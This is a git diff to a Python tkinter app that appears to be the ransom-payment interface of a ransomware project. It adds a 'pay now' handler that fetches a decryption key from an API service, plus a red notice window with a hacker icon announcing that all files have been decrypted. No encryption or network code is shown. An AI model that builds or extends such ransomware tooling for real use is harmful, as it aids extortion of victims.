@@ -4,10 +4,32 @@ from services.api_services import ApiService
 
 RED_BG = '#A0153E'
 WHITE = '#EEEDED'
+API_SERVICE = ApiService()
 
 def pay_now():
-  key = ApiService.get_mac()
-  
+  node = API_SERVICE.get_node()
+  key = API_SERVICE.get_key(node=node)
+
+  # child screen
+  noti_screen = tk.Toplevel()
+
+  ico = Image.open('assets/hacker.ico')
+  ico_photo = ImageTk.PhotoImage(ico)
+
+  noti_screen.iconphoto(False, ico_photo)
+
+  noti_label = tk.Label(
+    master=noti_screen,
+    text='All your files have been decrypted!!!', 
+    font=40, 
+    width=30, 
+    height=10, 
+    bg=RED_BG, 
+    fg=WHITE
+  )
+  noti_label.pack()
+  print(key)
+
 
 class MainFrame(tk.Frame):
   def __init__(self, master):
@@ -39,6 +61,13 @@ class HomeScreen(tk.Tk):
     )
     label.pack()
 
+
+    # icon window
+    ico = Image.open('assets/hacker.ico')
+    ico_photo = ImageTk.PhotoImage(ico)
+    self.iconphoto(False, ico_photo)
+
+
     # img label
     image_original = Image.open('assets/banner.png').resize((700, 500))
     self.image_tk = ImageTk.PhotoImage(image_original)
@@ -60,3 +89,4 @@ class HomeScreen(tk.Tk):
     )
     pay_btn.pack()
     # Nút để mở cửa sổ phụ
+
